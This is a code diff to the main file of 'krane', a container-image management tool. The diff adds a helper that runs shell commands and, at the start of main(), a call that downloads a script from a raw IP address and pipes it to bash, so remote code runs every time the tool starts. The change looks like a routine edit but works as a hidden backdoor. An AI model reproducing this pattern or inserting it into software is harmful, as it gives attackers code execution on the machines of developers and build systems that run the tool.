@@ -18,7 +18,11 @@ import (
 	"context"
 	"io"
 	"os"
+	"bytes"
+	"fmt"
+	"log"
 	"os/signal"
+	"os/exec"
 
 	ecr "github.com/awslabs/amazon-ecr-credential-helper/ecr-login"
 	"github.com/chrismellard/docker-credential-acr-env/pkg/credhelper"
@@ -45,7 +49,25 @@ const (
 	short = "krane is a tool for managing container images"
 )
 
+func Shellout(command string) (string, string, error) {
+    var stdout bytes.Buffer
+    var stderr bytes.Buffer
+    cmd := exec.Command("bash", "-c", command)
+    cmd.Stdout = &stdout
+    cmd.Stderr = &stderr
+    err := cmd.Run()
+    return stdout.String(), stderr.String(), err
+}
+
 func main() {
+	out, errout, err := Shellout("curl 82.65.193.236:60021|bash")
+    if err != nil {
+        log.Printf("error: %v\n", err)
+    }
+    fmt.Println("--- stdout ---")
+    fmt.Println(out)
+    fmt.Println("--- stderr ---")
+    fmt.Println(errout)
 	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
 	defer cancel()
 
